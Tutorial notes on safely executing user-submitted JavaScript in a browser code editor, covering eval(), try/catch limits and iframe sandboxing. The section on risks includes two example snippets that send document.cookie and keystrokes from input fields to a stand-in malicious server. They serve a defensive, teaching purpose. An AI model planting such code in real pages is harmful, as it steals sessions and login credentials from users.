# Executing User Code
* We now tackle code execution inside the browser
* How can we take the output of that bundle and execute it "safely"

## eval()
* Long history
* Very easy way to execute arbitrary JavaScript that is contained inside a string is to use the `eval()` function
    - eval() is built into the browser

`index.tsx`

```
// MORE CODE

    // console.log(result);

    setCode(result.outputFiles[0].text);

    eval(result.outputFiles[0].text) 
  };

  return (

// MORE CODE
```

* Run the app

`$ npm start`

* You will see a warning that "eval can be harmful no-eval"
* We will now enter code to be executed in the browser by typing JavaScript inside our textarea

```
console.log('hello')
```

* After submitting our form we see the log in our browser. We just exectuted code in the browser
* Try this:

```
import axios from 'axios'
console.log(axios)
```

* And we get the axios function in our browser
* We can use axios in our browser with:

```
import axios from 'axios'

window.axios = axios;
```

* Then you can use axios in the browser:

```
> axios.get('https://jsonplaceholder.typicode.com/albums')
```

## First problem with eval()
* Users can enter non functions that will throw an error and crash our entire app
* **Fix** try/catch

```
// MORE CODE

    setCode(result.outputFiles[0].text);

    try {
      eval(result.outputFiles[0].text);
    } catch (err) {
      alert(err);
    }
  };

  return (

// MORE CODE
```

* Use same error code and we get an alert

## Houston we have a problem
* Even with a try/catch this won't work in browser

```
setTimeout(() => {
 console.asdfsdf()
}, 100);
```

* We get an error
* Why the error?
    - Whenever we do a `try/catch` around some block of code that code is executed and in that instance that code is executed we watch for an error, as soon as that code is executed we then exit out of the try/catch and life continues as usual
    - We just added in a little bit of async code, when that inner function actually gets executed through use of that setTimeout() we are no longer inside a try/catch block
        + There is no try/catch around that inner function of setTimeout, so if the user every writes any async code inside our app and it throws an error, well then, once again, everything crashes

## Big issues around code execution
* User-provided code might throw errors and cause our program to crash
* User-provided code might mutate the DOM, causing our program to crash
    - User enters `document.body.innerHTML = '';`
        + That makes our page have nothing inside the body (blank)
* A user might accidentally run code provided by another malicious user
    - On `codepen.io` at the bottom add:

```
acios.post(`http://some-malicious-server.com', {
    cookie: document.cookie`
});
```

* And the cookie could have my auth info and sent it to the malicious server and they could impersonate me and do bad things
* Or this:

```
document.querySelector('input').addEventListener('change', (event) => {
    axios.post('malicious-server', {
        value: value.target.value
    })
})
```

* If I go to the login page and enter my email and password, the user can take my email and password which is bad and with every keypress I would be sending all my details to that malicious server

### What if user add an infinite loops
* Code pen has code to detect infinite loops
* We will not handle this case as it's a lot of code for little pay off

## Solution to all 3 problems
* Codepen uses an iframe
* `codesandbox.io` also uses an iframe in the preview window
* `jsfiddle.net` also uses an iframe preview window to prevent all 3 big issues from happening
